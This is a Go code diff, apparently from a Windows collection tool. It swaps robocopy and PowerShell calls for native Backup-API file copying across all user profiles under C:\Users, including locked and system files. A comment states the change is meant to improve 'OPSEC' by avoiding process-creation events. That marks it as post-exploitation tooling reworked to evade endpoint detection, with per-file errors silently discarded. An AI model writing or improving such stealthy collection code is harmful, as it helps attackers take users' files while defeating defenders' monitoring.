@@ -9,69 +9,96 @@ import (
 	"strings"
 )
 
-// copyWithRobocopy copies files matching pattern from srcDir to dstDir using robocopy /B (Backup mode).
-// Backup mode uses SeBackupPrivilege to access locked/system files without exclusive file handles.
-// Robocopy exit codes: 0=no copy needed, 1=files copied OK, 2-7=warnings, >=8=errors.
-func copyWithRobocopy(ctx context.Context, srcDir, pattern, dstDir string) error {
+// copyNative copies files matching pattern from srcDir to dstDir using native Backup APIs.
+// This avoids calling `robocopy.exe`, improving OPSEC by avoiding Process Creation events.
+func copyNative(ctx context.Context, srcDir, patternStr, dstDir string) error {
 	if err := os.MkdirAll(dstDir, 0755); err != nil {
 		return fmt.Errorf("failed to create dest dir %s: %w", dstDir, err)
 	}
-	cmd := exec.CommandContext(ctx, "robocopy", srcDir, dstDir, pattern,
-		"/B",   // Backup mode (SeBackupPrivilege)
-		"/NJH", // No job header
-		"/NJS", // No job summary
-		"/NFL", // No file list
-		"/NDL", // No directory list
-		"/NC",  // No file classes
-		"/NS",  // No file sizes
-	)
-	if err := cmd.Run(); err != nil {
-		if exitErr, ok := err.(*exec.ExitError); ok {
-			if exitErr.ExitCode() < 8 {
-				return nil // exit codes 0-7 are informational
+
+	entries, err := os.ReadDir(srcDir)
+	if err != nil {
+		return fmt.Errorf("failed to read srcDir %s: %w", srcDir, err)
+	}
+
+	var hasMatched bool
+	for _, entry := range entries {
+		if entry.IsDir() {
+			continue
+		}
+		matched, _ := filepath.Match(patternStr, entry.Name())
+		if matched {
+			hasMatched = true
+			srcPath := filepath.Join(srcDir, entry.Name())
+			dstPath := filepath.Join(dstDir, entry.Name())
+			err := CopyFileNativeBackup(ctx, srcPath, dstPath)
+			if err != nil {
+				// We log or ignore individual file errors to continue copying
+				_ = err
 			}
 		}
-		return fmt.Errorf("robocopy failed copying %s\\%s: %w", srcDir, pattern, err)
+	}
+	if !hasMatched {
+		return fmt.Errorf("no files matched %s in %s", patternStr, srcDir)
 	}
 	return nil
 }
 
-// copyWithRobocopyRecursive recursively copies srcDir tree into dstDir using Backup mode.
-func copyWithRobocopyRecursive(ctx context.Context, srcDir, dstDir string) error {
+// copyNativeRecursive recursively copies srcDir tree into dstDir using native Backup APIs.
+func copyNativeRecursive(ctx context.Context, srcDir, dstDir string) error {
 	if err := os.MkdirAll(dstDir, 0755); err != nil {
 		return fmt.Errorf("failed to create dest dir %s: %w", dstDir, err)
 	}
-	cmd := exec.CommandContext(ctx, "robocopy", srcDir, dstDir, "*",
-		"/E",   // Copy subdirectories including empty ones
-		"/B",   // Backup mode
-		"/NJH", "/NJS", "/NFL", "/NDL", "/NC", "/NS",
-	)
-	if err := cmd.Run(); err != nil {
-		if exitErr, ok := err.(*exec.ExitError); ok {
-			if exitErr.ExitCode() < 8 {
-				return nil
-			}
+
+	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return nil // Skip files we cannot even stat. Walk continues.
 		}
-		return fmt.Errorf("robocopy recursive failed for %s: %w", srcDir, err)
-	}
-	return nil
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
+
+		rel, err := filepath.Rel(srcDir, path)
+		if err != nil {
+			return nil
+		}
+
+		dstPath := filepath.Join(dstDir, rel)
+		if info.IsDir() {
+			_ = os.MkdirAll(dstPath, 0755)
+			return nil
+		}
+
+		_ = CopyFileNativeBackup(ctx, path, dstPath)
+		return nil
+	})
 }
 
 // getUserProfileDirs returns full paths of user home directories under C:\Users,
 // excluding system accounts (Public, Default, Default User, All Users).
 func getUserProfileDirs(ctx context.Context) ([]string, error) {
-	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-Command",
-		`Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notmatch '^(Public|Default|Default User|All Users)$' } | Select-Object -ExpandProperty FullName`)
-	output, err := cmd.Output()
+	usersDir := `C:\Users`
+	entries, err := os.ReadDir(usersDir)
 	if err != nil {
 		return nil, fmt.Errorf("failed to enumerate user profiles: %w", err)
 	}
+
 	var dirs []string
-	for _, line := range strings.Split(strings.TrimSpace(string(output)), "\n") {
-		line = strings.TrimRight(strings.TrimSpace(line), "\r")
-		if line != "" {
-			dirs = append(dirs, line)
+	excluded := map[string]bool{
+		"Public":       true,
+		"Default":      true,
+		"Default User": true,
+		"All Users":    true,
+	}
+
+	for _, entry := range entries {
+		if !entry.IsDir() {
+			continue
 		}
+		if excluded[entry.Name()] {
+			continue
+		}
+		dirs = append(dirs, filepath.Join(usersDir, entry.Name()))
 	}
 	return dirs, nil
 }
